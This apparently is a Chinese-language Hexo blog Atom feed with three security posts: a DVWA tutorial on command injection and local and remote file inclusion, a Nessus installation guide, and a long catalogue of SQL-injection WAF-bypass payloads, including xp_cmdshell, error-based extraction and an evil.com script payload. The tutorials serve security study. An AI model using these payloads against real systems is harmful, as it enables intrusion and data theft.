<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Secer</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-28T11:55:46.341Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>shiqian</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码注入漏洞</title>
    <link href="http://yoursite.com/2018/08/28/%E6%89%93%E7%A9%BFDVWA%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/28/打穿DVWA指北/</id>
    <published>2018-08-28T07:24:05.000Z</published>
    <updated>2018-08-28T11:55:46.341Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-178.png" alt="upload successful"></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、<br>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。命令执行是代码注入的一种。</p><p>直接输入127.0.0.1，显示可以执行</p><p><img src="\images\pasted-174.png" alt="upload successful"></p><h4 id="攻击绕过"><a href="#攻击绕过" class="headerlink" title="攻击绕过"></a>攻击绕过</h4><p>在linux上绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">；</span><br><span class="line">|</span><br><span class="line">||</span><br><span class="line">&amp;</span><br><span class="line">空格</span><br><span class="line">tac</span><br></pre></td></tr></table></figure></p><p>windows上绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|</span><br><span class="line">||</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br></pre></td></tr></table></figure></p><p>一些区别<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;前面的语句为假则直接执行后面的</span><br><span class="line">&amp;&amp;前面的语句为假则直接出错，后面的也不执行</span><br><span class="line">|直接执行后面的语句</span><br><span class="line">||前面出错执行后面的</span><br></pre></td></tr></table></figure></p><h4 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">尽量少用执行命令的函数或者直接禁用</span><br><span class="line">参数值尽量使用引号包括</span><br><span class="line">在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</span><br></pre></td></tr></table></figure><h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>本地包含漏洞是PHP中一种典型的高危漏洞。由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server会将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p><p><img src="\images\pasted-175.png" alt="upload successful"></p><p>但是由于page参数没有过滤，我们可以自己提交参数内容，这个时候就导致了包含漏洞的出现,赋值参数为/etc/passwd，成功包含</p><h4 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h4><h5 id="1-自己上传文件并实现包含"><a href="#1-自己上传文件并实现包含" class="headerlink" title="1.自己上传文件并实现包含"></a>1.自己上传文件并实现包含</h5><p>这里主要是结合服务器一些文件上传点，比如头像上传、相册照片上传等，而后结合php的%00截断特性成功利用包含漏洞（php5.4之后已修复截断特性），假设我们可以自定义上传头像，头像文件在网站根目录的photo下，具体目录可以传上去之后查看图片Url信息。上传时，们可以简单的改一下后缀名，在php代码前加一个GIF89a就可绕过大多数检测。</p><h5 id="2-包含环境变量文件"><a href="#2-包含环境变量文件" class="headerlink" title="2.包含环境变量文件"></a>2.包含环境变量文件</h5><p>Linux下有一个文件/proc/self/environ，这个文件里保存了系统的一些变量，用户可通过修改浏览器的agent信息插入自己的内容到该文件，将php代码写进去之后再利用LFI进行包含就可以实现漏洞的利用。</p><p><img src="\images\pasted-176.png" alt="upload successful"></p><h5 id="3-包含web-server日志文件"><a href="#3-包含web-server日志文件" class="headerlink" title="3.包含web server日志文件"></a>3.包含web server日志文件</h5><p>Apache的日志文件在LFI漏洞的利用中是非常常见的。因为不管我们提交的Get请求或者Post请求都会被apache记录到日志文件里。所以我们可以控制请求内容，将恶意代码写入日志文件，从而实现包含。</p><h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><h4 id="攻击绕过-1"><a href="#攻击绕过-1" class="headerlink" title="攻击绕过"></a>攻击绕过</h4><p>构造url<br><code>http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt</code><br>为了增加隐蔽性，可以对<a href="http://192.168.5.12/phpinfo.txt进行编码" target="_blank" rel="noopener">http://192.168.5.12/phpinfo.txt进行编码</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74</span><br></pre></td></tr></table></figure></p><p>可以使用双写绕过<br>例如page=ht<a href="http://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。" target="_blank" rel="noopener">http://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。</a></p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">采用白名单</span><br><span class="line">禁用危险函数</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Nessus安装使用</title>
    <link href="http://yoursite.com/2018/08/28/Nessus%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/08/28/Nessus安装使用/</id>
    <published>2018-08-28T02:59:05.000Z</published>
    <updated>2018-08-28T03:56:14.909Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-152.png" alt="upload successful"></p><h1 id="Nessus简介"><a href="#Nessus简介" class="headerlink" title="Nessus简介"></a>Nessus简介</h1><h4 id="优势："><a href="#优势：" class="headerlink" title="优势："></a>优势：</h4><p>Nessus Professional是行业中部署最广泛的漏洞评估解决方案，可帮助用户减少组织的攻击面并确保合规性。Nessus具有高速资产发现，配置审计，目标分析，恶意软件检测，敏感数据发现等功能。</p><p>Nessus支持比竞争对手解决方案更多的技术，扫描操作系统，网络设备，虚拟机管理程序，数据库，Web服务器以及关键基础设施，以解决漏洞，威胁和违规问题。</p><p>随着世界上最大的不断更新的漏洞和配置检查库，以及Tenable公司的专家漏洞研究小组的支持，Nessus设定了漏洞扫描速度和准确性的标准。</p><h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><p>提供完整的电脑漏洞扫描服务, 并随时更新其漏洞数据库。</p><p>可同时在本机或远端上摇控, 进行系统的漏洞分析扫描。</p><p>其运作效能能随着系统的资源而自行调整。</p><p>可自行定义插件(Plug-in)，完整支持SSL (Secure Socket Layer)。</p><h1 id="Nessus的安装"><a href="#Nessus的安装" class="headerlink" title="Nessus的安装"></a>Nessus的安装</h1><h4 id="常规安装"><a href="#常规安装" class="headerlink" title="常规安装"></a>常规安装</h4><p>1.从<a href="https://www.tenable.com/products/nessus/select-your-operating-system上下载对应操作系统版本的nessus" target="_blank" rel="noopener">https://www.tenable.com/products/nessus/select-your-operating-system上下载对应操作系统版本的nessus</a></p><p>2.下载下来之后按照一般软件的安装过程进行安装，安装可以更改安装目录</p><p>3.安装完成之后，会自动在默认浏览器中进入欢迎界面</p><p>4.一路继续，之后有一步需要输入激活码的步骤，输入在nessus官网注册（<a href="https://www.tenable.com/products/nessus-home）时发送到自己邮箱中的注册码，之后点击继续" target="_blank" rel="noopener">https://www.tenable.com/products/nessus-home）时发送到自己邮箱中的注册码，之后点击继续</a></p><p>5.成功之后，输入配置时的用户名和密码就可以登录到nessus中</p><p><img src="\images\pasted-153.png" alt="upload successful"></p><h4 id="离线安装"><a href="#离线安装" class="headerlink" title="离线安装"></a>离线安装</h4><p>在安装注册过程的4步，常常出现“Plugin Download Fail”问题，这个时候可以采用离线加载继续安装。下载离线安装包all-2.0.tar.gz并将它拷贝到nessus的安装目录下，在命令提示符下切换到nessus的安装目录下输入如下命令</p><p><code>nessuscli update all-2.0.tar.gz</code></p><h1 id="Nessus的使用"><a href="#Nessus的使用" class="headerlink" title="Nessus的使用"></a>Nessus的使用</h1><h4 id="Nessus导航"><a href="#Nessus导航" class="headerlink" title="Nessus导航"></a>Nessus导航</h4><p>顶部的导航条显示两个主页面的链接：扫描和设置。您可以使用这两个页面执行所有Nessus主要任务。点击页面名称打开相应的页面。</p><p><img src="\images\pasted-154.png" alt="upload successful"></p><h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><p>在“ 扫描”页面上，您可以创建，查看和管理扫描和资源。要访问“ 扫描”页面，请在顶部导航栏中单击“ 扫描”。左侧导航栏显示文件夹和资源两部分。</p><p><img src="\images\pasted-155.png" alt="upload successful"></p><h4 id="文件夹"><a href="#文件夹" class="headerlink" title="文件夹"></a>文件夹</h4><p>文件夹”部分始终包含以下不能删除的默认文件夹：我的扫描、所有扫描、垃圾桶。</p><p>当您访问“ 扫描”页面时，将显示“ 我的扫描”文件夹。当您创建扫描时，它默认显示在“ 我的扫描”文件夹中。</p><p>在所有扫描的文件夹显示所创建的所有扫描以及与有权限进行交互的任何扫描。可以点击文件夹中的扫描来查看扫描结果。</p><p>垃圾桶”文件夹显示已删除的扫描。可以从Nessus实例中永久删除扫描，或将扫描恢复到选定的文件夹。如果删除包含扫描的文件夹，则该文件夹中的所有扫描都将移至”垃圾桶”文件夹。存储在“ 垃圾箱”文件夹中的扫描将在30天后自动删除。</p><p><img src="\images\pasted-156.png" alt="upload successful"></p><h4 id="插件规则"><a href="#插件规则" class="headerlink" title="插件规则"></a>插件规则</h4><p>允许隐藏或改变任何给定的插件的严重性。另外，规则可以限制在特定的主机或特定的时间范围内。在此页面上，可以查看，创建，编辑和删除规则。</p><p><img src="\images\pasted-157.png" alt="upload successful"></p><h4 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h4><p>该扫描器页面显示的链接键和遥控器的扫描器列表。您可以点击链接的扫描器查看有关该扫描器的详细信息。</p><p>扫描器由扫描器类型标识，并指示扫描器是否具有共享权限。</p><p>可以使用链接密钥或有效帐户凭证将远程扫描器链接到Nessus Manager。一旦链接，扫描器可以在本地进行管理，并在配置扫描时进行选择。</p><p><img src="\images\pasted-158.png" alt="upload successful"></p><h4 id="扫描模板"><a href="#扫描模板" class="headerlink" title="扫描模板"></a>扫描模板</h4><p>可用的模板可能会有所不同。Nessus界面提供产品中每个模板的简要说明</p><p><img src="\images\pasted-159.png" alt="upload successful"></p><h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><p>每个策略都存在以下设置，但可用的配置项目可能因所选模板而异：</p><p><img src="\images\pasted-160.png" alt="upload successful"></p><h4 id="凭证"><a href="#凭证" class="headerlink" title="凭证"></a>凭证</h4><p>每个策略都存在以下设置，但可用的配置项目可能因所选模板而异：</p><h4 id="云服务"><a href="#云服务" class="headerlink" title="云服务"></a>云服务</h4><p>数据库：包括MongoDB，Oracle，MySQL，DB2，PostgreSQL和SQL Server</p><p>主机：其中包括Windows登录，SSH和SNMPv3</p><p>其他服务：VMware，Red Hat Enterprise Virtualization等</p><p>明文身份验证机制：包括FTP，HTTP，POP3和其他服务</p><p><img src="\images\pasted-161.png" alt="upload successful"></p><h4 id="合规检测"><a href="#合规检测" class="headerlink" title="合规检测"></a>合规检测</h4><p>Nessus可以执行网络服务的漏洞扫描以及登录到服务器以发现任何缺少的补丁。没有漏洞并不意味着服务器配置是正确的，或者与特定标准要求“相符</p><p><img src="\images\pasted-162.png" alt="upload successful"></p><h4 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h4><p>插件选项可以选择插件系列的安全检查或单个插件检查</p><p><img src="\images\pasted-163.png" alt="upload successful"></p><h4 id="SMTP服务"><a href="#SMTP服务" class="headerlink" title="SMTP服务"></a>SMTP服务</h4><p>SMTP服务器页面显示允许您配置简单邮件传输协议（SMTP）服务器的选项。当您配置SMTP服务器时，Nessus会将扫描结果通过电子邮件发送到您指定的收件人列表。</p><p><img src="\images\pasted-164.png" alt="upload successful"></p><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><p>在此页面上，可以查看，创建，编辑和删除用户。一旦创建，用户就配置了一个角色，角色决定了用户的扫描器权限。</p><p><img src="\images\pasted-165.png" alt="upload successful"></p><h4 id="扫描报告"><a href="#扫描报告" class="headerlink" title="扫描报告"></a>扫描报告</h4><p>点击扫描结果文件夹，选择要下载的扫描任务</p><p><img src="\images\pasted-170.png" alt="upload successful"><br>选择下载目标，点击左上角输出，选择输出文件格式。</p><p><img src="\images\pasted-171.png" alt="upload successful"></p><h1 id="启动或停止Nessus"><a href="#启动或停止Nessus" class="headerlink" title="启动或停止Nessus"></a>启动或停止Nessus</h1><h4 id="windows下"><a href="#windows下" class="headerlink" title="windows下"></a>windows下</h4><p><img src="\images\pasted-166.png" alt="upload successful"></p><h4 id="linux下"><a href="#linux下" class="headerlink" title="linux下"></a>linux下</h4><p><img src="\images\pasted-167.png" alt="upload successful"></p><p><img src="\images\pasted-168.png" alt="upload successful"></p><p>参数</p><p><img src="\images\pasted-169.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入绕过</title>
    <link href="http://yoursite.com/2018/08/27/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <id>http://yoursite.com/2018/08/27/SQL注入绕过/</id>
    <published>2018-08-27T12:22:05.000Z</published>
    <updated>2018-08-28T03:59:48.355Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-172.png" alt="upload successful"></p><h2 id="0x1-WAF的常见特征"><a href="#0x1-WAF的常见特征" class="headerlink" title="0x1 WAF的常见特征"></a>0x1 WAF的常见特征</h2><p> 之所以要谈到WAF的常见特征，是为了更好的了解WAF的运行机制，这样就能增加几分绕过的机会了。本文不对WAF做详细介绍，只谈及几点相关的。</p><p> 总体来说，WAF(Web Application Firewall)的具有以下四个方面的功能：</p><ol><li><p>审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话</p></li><li><p>访问控制设备：用来控制对<a href="http://www.moonsec.com/tag/Web" target="_blank" rel="noopener">Web</a>应用的访问，既包括主动安全模式也包括被动安全模式</p></li><li><p><a href="http://lib.csdn.net/base/architecture" target="_blank" rel="noopener">架构</a>/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</p></li><li><p>WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</p></li></ol><h2 id="WAF的常见特点："><a href="#WAF的常见特点：" class="headerlink" title="WAF的常见特点："></a>WAF的常见特点：</h2><p> 异常检测协议：拒绝不符合HTTP标准的请求</p><p> 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证</p><p> 白名单&amp;黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题</p><p> 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活</p><p> 状态管理：重点进行会话保护</p><p> 另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</p><p> 如果是对于扫描器，WAF有其识别之道：</p><p> 扫描器识别主要由以下几点：</p><p> 1) 扫描器指纹(head字段/请求参数值)，以wvs为例，会有很明显的Acunetix在内的标识</p><p> 2)  单IP+ cookie某时间段内触发规则次数</p><p> 3)  隐藏的链接标签等(<a>)</a></p><p> 4)  Cookie植入</p><p> 5)  验证码验证，扫描器无法自动填充验证码</p><p> 6)  单IP请求时间段内<a href="http://www.moonsec.com/tag/Web" target="_blank" rel="noopener">Web</a>server返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404</p><h2 id="0x2-绕过WAF的方法"><a href="#0x2-绕过WAF的方法" class="headerlink" title="0x2 绕过WAF的方法"></a>0x2 绕过WAF的方法</h2><p>  从目前能找到的资料来看，我把这些绕过waf的技术分为9类，包含从初级到高级技巧</p><p> a) 大小写混合</p><p> b)替换关键字</p><p> c)使用编码</p><p> d)使用注释</p><p> e)等价函数与命令</p><p> f)特殊符号</p><p> g)HTTP参数控制</p><p> h)缓冲区溢出</p><p> i)整合绕过</p><h4 id="a-大小写绕过"><a href="#a-大小写绕过" class="headerlink" title="a) 大小写绕过"></a>a) 大小写绕过</h4><p> 大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法<a href="http://www.moonsec.com/tag/%E7%BB%95%E8%BF%87" target="_blank" rel="noopener">绕过</a>，这是最简单的绕过技术</p><p> 举例：z.com/index.<a href="http://lib.csdn.net/base/php" target="_blank" rel="noopener">PHP</a>?page_id=-15 uNIoN sELecT 1,2,3,4 </p><p> 示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个关键字或每种情况都有处理</p><h4 id="b-替换关键字"><a href="#b-替换关键字" class="headerlink" title="b)替换关键字"></a>b)替换关键字</h4><p> 这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过</p><p> 举例：z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</p><p> 同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT，不建议对此抱太大期望</p><p>c)使用编码</p><p> 1.URL编码</p><p> 在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29</p><p> 普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT</p><p> 2.十六进制编码</p><p> 举例：z.com/index.php?page_id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4…</p><p> 　　　SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</p><p> 示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点</p><p> 3.Unicode编码</p><p> Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p><p> 看一下常用的几个符号的一些Unicode编码：</p><p> 单引号:   %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p><p> 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p><p> 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p><p> 右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p><p> 举例：?id=10%D6‘%20AND%201=2%23　　</p><p> 　　　SELECT ‘Ä’=’A’; #1</p><p> 两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用</p><p> 第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p><p> 另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下</p><p> 常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例子</p><h4 id="d-使用注释"><a href="#d-使用注释" class="headerlink" title="d) 使用注释"></a>d) 使用注释</h4><p> 看一下常见的用于注释的符号有哪些：//, – , /**/, #, –+,–  -, ;，–a</p><p> 1.普通注释</p><p> 举例：z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　　　</p><p> 　　　‘union%a0select pass from users#</p><p> /**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询</p><p> 2.内联注释</p><p> 相比普通注释，内联注释用的更多，它有一个特性/!**/只有<a href="http://lib.csdn.net/base/mysql" target="_blank" rel="noopener">MySQL</a>能识别</p><p> 举例：index.php?page_id=-15 /<em>!UNION</em>/ /<em>!SELECT</em>/ 1,2,3</p><p> 　　　?page_id=null%0A/<strong>//<em>!50000%55nIOn</em>//<em>yoyu</em>/all/</strong>/%0A/<em>!%53eLEct</em>/%0A/<em>nnaa</em>/+1,2,3,4…</p><p> 两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用</p><h4 id="e-等价函数与命令"><a href="#e-等价函数与命令" class="headerlink" title="e)等价函数与命令"></a>e)等价函数与命令</h4><p> 有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用</p><p> 1.函数或变量</p><p> hex()、bin() ==&gt; ascii()</p><p> sleep() ==&gt;benchmark()</p><p> concat_ws()==&gt;group_concat()</p><p> mid()、substr() ==&gt; substring()</p><p> @@user ==&gt; user()</p><p> @@datadir ==&gt; datadir()</p><p> 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　</p><p> 或者：substr((select ‘password’),1,1) = 0x70</p><p> 　　　strcmp(left(‘password’,1), 0x69) = 1</p><p> 　　   strcmp(left(‘password’,1), 0x70) = 0</p><p> 　　　strcmp(left(‘password’,1), 0x71) = -1</p><p> 上述这几个示例用于说明有时候当某个函数不能使用时，还可以找到其他的函数替代其实现，置于select、uinon、where等关键字被限制如何处理将在后面filter部分讨论</p><p> 2.符号</p><p> and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了</p><p> 在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/</p><p> 3.生僻函数</p><p> MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x="_"></script> ’,’/script/@x/’,’src=//evil.com’);　　　　　　　　　　</p><p> ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))</p><p> SELECT xmlelement(name img,xmlattributes(1as src,’a\l\x65rt(1)’as \117n\x65rror));　//postgresql</p><p> ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p><p> MySQL、PostgreSQL、<a href="http://lib.csdn.net/base/oracle" target="_blank" rel="noopener">Oracle</a>它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制</p><h4 id="f-特殊符号"><a href="#f-特殊符号" class="headerlink" title="f) 特殊符号"></a>f) 特殊符号</h4><p> 这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法，涉及信息量比前面提到的几种都要多</p><p> 先看下乌云drops上“waf的绕过技巧”一文使用的几个例子：</p><p> 1.使用反引号<code>，例如select</code>version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p><p> 2.神奇的”-+.”，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</p><p> 3.@符号，select@^1.from users; @用于变量定义如<strong>@**</strong>var_name**，一个@表示用户定义，@@表示系统变量</p><p> 4.Mysql function() as xxx  也可不用as和空格　　 select-count(id)test from users;  //绕过空格限制</p><p> 可见，使用这些字符的确是能做很多事，也证实了那句老话，只有想不到，没有做不到</p><p> 本人搜罗了部分可能发挥大作用的字符(未包括’、*、/等在内，考虑到前面已经出现较多次了)：`、~、!、@、%、()、[]、.、-、+ 、|、%00</p><p> 举例：</p><p> 关键字拆分：‘se’+’lec’+’t’</p><p> 　　　　　　%S%E%L%E%C%T 1</p><p> 　　　　　　1.aspx?id=1;EXEC(‘ma’+’ster..x’+’p_cm’+’dsh’+’ell ”net user”’)</p><p> !和()：’ or –+2=- -!!!’2</p><p>  　　　 id=1+(UnI)(oN)+(SeL)(EcT)　//另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔</p><p> 本节最后在给出一些和这些字符多少有点关系的操作符供参考：</p><p> >&gt;, &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN</p><p> 使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家<a href="http://lib.csdn.net/base/mysql" target="_blank" rel="noopener">数据库</a>对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段</p><h4 id="g-HTTP参数控制"><a href="#g-HTTP参数控制" class="headerlink" title="g) HTTP参数控制"></a>g) HTTP参数控制</h4><p> 这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制</p><p> 1.HPP(HTTP Parameter Polution)</p><p> 举例：/?id=1;select+1,2,3+from+users+where+id=1—</p><p> 　　　/?id=1;select+1&amp;id=2,3+from+users+where+id=1—</p><p> 　　　/?id=1/*<em>/union/</em>&amp;id=<em>/select/</em>&amp;id=<em>/pwd/</em>&amp;id=<em>/from/</em>&amp;id=*/users</p><p> 2.HPF(HTTP Parameter Fragment)</p><p> 这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)</p><p> 举例：　</p><p> 　　/?a=1+union/<em>&amp;b=</em>/select+1,pass/<em>&amp;c=</em>/from+users–</p><p> 　　select <em> from table where a=1 union/</em> and b=<em>/select 1,pass/</em> limit */from users—</p><p> 看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。</p><p> 3.HPC(HTTP Parameter Contamination)</p><p> 这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染</p><p> RFC2396定义了如下一些字符：</p><p> Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ‘ ()<br> Reserved : ; / ? : @ &amp; = + $ ,<br> Unwise : { } | \ ^ [ ] `</p><h4 id="h-缓冲区溢出-Advanced"><a href="#h-缓冲区溢出-Advanced" class="headerlink" title="h) 缓冲区溢出(Advanced)"></a>h) 缓冲区溢出(Advanced)</h4><p> 缓冲区溢出用于对付WAF，有不少WAF是<a href="http://lib.csdn.net/base/c" target="_blank" rel="noopener">C语言</a>写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p><p> 举例：</p><p> ?id=1 and (select 1)=(Select  0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</p><p> 示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p><h4 id="i-整合绕过"><a href="#i-整合绕过" class="headerlink" title="i) 整合绕过"></a>i) 整合绕过</h4><p>整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说  是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>centos7初始化硬盘分区、挂载</title>
